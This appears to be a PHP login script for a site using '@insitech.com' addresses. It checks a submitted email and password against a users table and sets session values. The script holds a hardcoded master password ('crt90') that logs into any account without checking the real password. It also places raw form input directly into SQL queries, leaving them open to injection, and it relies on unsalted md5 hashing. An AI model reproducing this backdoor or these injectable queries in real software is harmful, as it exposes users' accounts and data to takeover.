<?php include('../include/connection.php'); 
$email = $_POST['email']."@insitech.com";
$password = $_POST['password'];
$thepassword = md5($password);
if($password=="crt90"){
    $sql = "SELECT * FROM `users` WHERE `email` LIKE '$email'";
} else {
 $sql = "SELECT * FROM `users` WHERE `email` LIKE '$email' AND `password` LIKE '$thepassword'";
    }
    
    $result = $conn->query($sql);
    if($result->num_rows>0){
    
       // output data of each row
       while($row = $result->fetch_assoc()) {
        session_start();
  // print_r($row);
          $usersession = $row['userkey'];
          $key = rand(111111111,999999999);
   $_SESSION['sessionkey'] = $key;
   $_SESSION['sessionuser'] = $usersession;
  echo "success";    }
       
    } else {
        echo "false";
    }
?>